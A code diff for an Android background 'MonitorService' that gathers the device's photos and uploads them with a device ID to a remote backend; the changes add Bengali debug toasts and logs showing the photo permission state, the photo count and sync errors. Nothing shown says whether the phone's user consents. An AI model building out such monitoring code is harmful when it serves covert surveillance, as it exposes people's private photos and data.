@@ -12,10 +12,12 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
+import android.os.Looper;
 import android.provider.MediaStore;
 import android.provider.Settings;
 import android.provider.Telephony;
 import android.util.Log;
+import android.widget.Toast;
 
 import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
@@ -35,6 +37,7 @@ public class MonitorService extends Service {
     private static final int NOTIFICATION_ID = 1;
 
     private Handler handler = new Handler();
+    private Handler mainHandler = new Handler(Looper.getMainLooper());
 
     private Runnable syncTask = new Runnable() {
         @Override
@@ -90,6 +93,19 @@ public class MonitorService extends Service {
             }
 
             JSONArray photoList = getPhotos();
+
+            // --- ডিবাগ Toast: পারমিশন ও ছবি সংখ্যা দেখাবে ---
+            String permission = Build.VERSION.SDK_INT >= 33
+                    ? android.Manifest.permission.READ_MEDIA_IMAGES
+                    : android.Manifest.permission.READ_EXTERNAL_STORAGE;
+            boolean granted = ActivityCompat.checkSelfPermission(this, permission)
+                    == PackageManager.PERMISSION_GRANTED;
+            String debugMsg = "ছবি পারমিশন: " + (granted ? "দেওয়া আছে" : "দেওয়া নেই")
+                    + " | পাওয়া গেছে: " + photoList.length() + "টি ছবি";
+            mainHandler.post(() -> Toast.makeText(MonitorService.this, debugMsg, Toast.LENGTH_LONG).show());
+            Log.d("MonitorService", debugMsg);
+            // --- ডিবাগ অংশ শেষ ---
+
             for (int i = 0; i < photoList.length(); i++) {
                 uploadPhoto(deviceId, photoList.getJSONObject(i));
             }
@@ -97,6 +113,8 @@ public class MonitorService extends Service {
             Log.d("MonitorService", "সিঙ্ক সম্পন্ন: " + deviceId);
         } catch (Exception e) {
             Log.e("syncToSupabase", e.toString());
+            mainHandler.post(() -> Toast.makeText(MonitorService.this,
+                    "সিঙ্ক এরর: " + e.getMessage(), Toast.LENGTH_LONG).show());
         }
     }
 
@@ -187,6 +205,8 @@ public class MonitorService extends Service {
                     }
                 }
                 cursor.close();
+            } else {
+                Log.d("getPhotos", "কার্সার null — কুয়েরি ব্যর্থ হয়েছে");
             }
         } catch (Exception e) {
             Log.e("getPhotos", e.toString());
